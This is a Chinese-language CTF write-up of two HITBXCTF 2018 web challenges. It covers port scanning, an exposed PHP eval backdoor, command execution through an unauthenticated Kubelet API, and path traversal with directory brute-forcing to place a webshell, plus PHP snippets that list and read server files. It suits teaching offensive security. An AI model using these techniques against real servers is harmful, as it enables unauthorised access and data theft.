---
title: HITBXCTF2018-Baby baby && upload
date: 2018-04-18 20:43:33
tags:
	- CTF
	- Writeup
---
前几天在HITBXCTF划了波水，就做出了几个水题，不过题目考察的东西还是挺新的，写个Writeup记一下。
<!-- more -->
### 1. Web-Baby baby

#### 1.1 题目要求
```
This is a pentest challenge, target 47.75.146.42
http://47.75.146.42
```



### 1.2 解题步骤

直接访问没啥有价值的东西，使用Nmap扫描端口

命令：
```
nmap -v -sV -p- 47.75.146.42
```

结果
```
PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH 7.4 (protocol 2.0)
80/tcp    open   http          nginx 1.12.2
443/tcp   closed https
2333/tcp  closed unknown
3389/tcp  closed ms-wbt-server
8009/tcp  closed ajp13
9999/tcp  open   http          nginx 1.12.2
10250/tcp open   ssl/unknown
```

大致测了测，9999端口不解析php，
直接访问：`http://47.75.146.42:9999/index.php`

下载`index.php`
```
This is a pentest challenge, open your mind!
<img style="width: 300px;" src="jd.png" alt="the picture is unrelated to this challenge, just a advertisement" />

<?php
    eval($__POST["backdoor"]);
?>
```
没啥用，查10250端口,找到一篇博客，上面写得很详细，直接利用。

```
https://ricterz.me/posts/Security%20Issues%20of%20Kubelet%20HTTP%28s%29%20Server
```

通过 /runningpods 获取正在运行的 Pod 列表：
```
https://47.75.146.42:10250/runningpods
```

![](http://osn75zd5c.bkt.clouddn.com/HITBCTF2018-Web-baby-1.png)

然后有命令执行漏洞，可以在容器里执行命令。一个个找flag

![](http://osn75zd5c.bkt.clouddn.com/HITBCTF2018-Web-baby-2.png)

在根目录发现flag.txt,直接读取

![](http://osn75zd5c.bkt.clouddn.com/HITBCTF2018-Web-baby-3.png)

HITB{KKKKKKKKKKKKKKKKKKKKKKKKK}


### 2. Web-Upload

#### 2.1 题目要求
```
Get shell !
http://47.90.97.18:9999
```
题目环境是Windows IIS7.0+php
直接右键查看源代码，发现提示。

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-1.png)
```
<!--pic.php?filename=default.jpg-->
```
访问一下，会返回default.jpg的长和宽


随便找个文件上传，回显了一个文件名。

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-2.png)

令filename=返回的文件名，会给出上传图片的长和宽。

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-3.png)

看样子后台用函数getimagesize()来处理文件，但是PHP中getimagesize()函数有漏洞，这和前几天dedecms爆后台目录的原理一眼，详情
```
http://www.freebuf.com/column/164698.html
```

然后可以借助pic.php的功能来穷举出上传文件的目录，由于爆破的人太多，使用burp单线程进行爆破，如图，这样就知道目录第一个字符是8,依次往后一位位找。

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-4.png)

最后就能得到文件上传的目录
```
?filename=..\..\..\..\..\..\inetpub\wwwroot\87194f13726af7cee27ba2cfe97b60df\1523619718.png
```
![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-5.png)

然后就可以直接上传shell。

> 参考链接：https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/

利用Windows系统特性，构造：

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-6.png)

直接上传后，访问，成功解析。

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-7.png)

在phpinofo()中查看被禁用的函数
```
assert,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
```
构造代码列出目录文件。
```
function listDirFiles($DirPath){ 
    if($dir = opendir($DirPath)){ 
         while(($file = readdir($dir))!== false){ 
                if(!is_dir($DirPath.$file)) 
                { 
                    echo "filename: $file<br />"; 
                } 
         } 
    } 
}
listDirFiles('c:/Inetpub/wwwroot/');
```
利用hackbar进行URL编码后上传。发现有flag.php

![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-8.png)

再构造代码
```
<?php
  $filename = "c:/Inetpub/wwwroot/flag.php";
  $handle = fopen($filename, "r");
  $contents = fread($h![image](https://note.youdao.com/favicon.ico)andle, filesize($filename));
  echo $contents;
  fclose($handle);
?>
```
![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-9.png)

成功获取flag